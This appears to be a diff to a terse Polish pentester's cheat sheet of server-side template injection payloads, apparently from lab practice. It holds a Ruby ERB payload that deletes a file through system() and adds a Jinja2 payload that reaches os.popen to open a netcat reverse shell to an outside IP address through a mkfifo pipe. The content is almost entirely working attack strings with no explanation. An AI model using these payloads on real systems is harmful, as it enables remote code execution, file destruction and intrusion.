@@ -5,3 +5,7 @@ Warto jest kodowac payloady w burpie np. do url-a.
 [Ruby]
 <%= 7*7 %>
 <%= system("rm /home/carlos/morale.txt") %>   
+
+
+[Python]
+ """{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.8.190.238 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}"""
